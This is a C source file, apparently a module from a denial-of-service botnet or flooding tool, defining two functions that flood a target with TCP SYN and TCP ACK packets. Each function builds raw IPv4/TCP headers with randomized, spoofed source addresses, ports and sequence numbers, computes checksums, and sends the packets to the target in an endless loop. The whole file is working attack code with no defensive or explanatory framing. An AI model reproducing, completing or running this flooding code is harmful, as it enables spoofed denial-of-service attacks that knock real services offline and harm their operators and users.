#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include "tcp_attack.h"
#include "checksum.h"
#include "types.h"

void attack_tcp_syn(struct target_data *target)
{
	char buffer[BUFFER_SIZE];
	struct ip_hdr *iph = (struct ip_hdr *)buffer;
	struct tcp_hdr *tcph = (struct tcp_hdr *)(buffer + sizeof(struct ip_hdr));

	srand(time(NULL));

	iph->version = 4;
	iph->ihl = 5;
	iph->tos = 0;
	iph->length = sizeof(struct ip_hdr) + sizeof(struct tcp_hdr);
	iph->ident = rand() & 0xfff;
	iph->frag = 0;
	iph->ttl = 64;
	iph->protocol = IPPROTO_TCP;
	iph->checksum = 0;
	iph->src_addr = rand();
	iph->dst_addr = target->target_addr;

	tcph->src_port = rand() & 0xffff;
	tcph->dst_port = rand() & 0xffff;
	tcph->seq_num = rand();
	tcph->ack_num = 0;
	tcph->offset = 5;
	tcph->reserved = 0;
	tcph->flag = TCP_SYN;
	tcph->win_size = rand() & 0xffff;
	tcph->checksum = 0;
	tcph->urg_ptr = 0;

	target->addr.sin_family = AF_INET;
	target->addr.sin_port = 0;
	target->addr.sin_addr.s_addr = target->target_addr;

	if ((target->sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1) {
		exit(EXIT_FAILURE);
	}

	int enable = 1;
	if (setsockopt(target->sockfd, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(int)) == -1) {
		exit(EXIT_FAILURE);
	}

	while (1) {
		iph->ident = rand() & 0xffff;
		iph->src_addr = rand();
		iph->checksum = 0;
		iph->checksum = checksum_generic((uint16_t *)iph, iph->length);
		
		tcph->src_port = rand() & 0xffff;
		tcph->dst_port = rand() & 0xffff;
		tcph->seq_num = rand();
		tcph->win_size = rand() & 0xffff;
		tcph->checksum = 0;
		tcph->checksum = checksum_tcp(iph, tcph, NULL, 0);

		if (sendto(target->sockfd, buffer, iph->length, 0,
				(struct sockaddr *)&target->addr,
				sizeof(struct sockaddr_in)) == -1) {
			exit(EXIT_FAILURE);
		}
	}
}

void attack_tcp_ack(struct target_data *target)
{
	char buffer[BUFFER_SIZE];
	struct ip_hdr *iph = (struct ip_hdr *)buffer;
	struct tcp_hdr *tcph = (struct tcp_hdr *)(buffer + sizeof(struct ip_hdr));

	srand(time(NULL));

	iph->version = 4;
	iph->ihl = 5;
	iph->tos = 0;
	iph->length = sizeof(struct ip_hdr) + sizeof(struct tcp_hdr);
	iph->ident = rand() & 0xfff;
	iph->frag = 0;
	iph->ttl = 64;
	iph->protocol = IPPROTO_TCP;
	iph->checksum = 0;
	iph->src_addr = rand();
	iph->dst_addr = target->target_addr;

	tcph->src_port = rand() & 0xffff;
	tcph->dst_port = rand() & 0xffff;
	tcph->seq_num = rand();
	tcph->ack_num = rand();
	tcph->offset = 5;
	tcph->reserved = 0;
	tcph->flag = TCP_ACK;
	tcph->win_size = rand() & 0xffff;
	tcph->checksum = 0;
	tcph->urg_ptr = 0;

	target->addr.sin_family = AF_INET;
	target->addr.sin_port = 0;
	target->addr.sin_addr.s_addr = target->target_addr;

	if ((target->sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1) {
		exit(EXIT_FAILURE);
	}

	int enable = 1;
	if (setsockopt(target->sockfd, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(int)) == -1) {
		exit(EXIT_FAILURE);
	}

	while (1) {
		iph->ident = rand() & 0xffff;
		iph->src_addr = rand();
		iph->checksum = 0;
		iph->checksum = checksum_generic((uint16_t *)iph, iph->length);

		tcph->src_port = rand() & 0xffff;
		tcph->dst_port = rand() & 0xffff;
		tcph->seq_num = rand();
		tcph->ack_num = rand();
		tcph->win_size = rand() & 0xffff;
		tcph->checksum = 0;
		tcph->checksum = checksum_tcp(iph, tcph, NULL, 0);

		if (sendto(target->sockfd, buffer, iph->length, 0,
				(struct sockaddr *)&target->addr,
				sizeof(struct sockaddr_in)) == -1) {
			exit(EXIT_FAILURE);
		}
	}
}
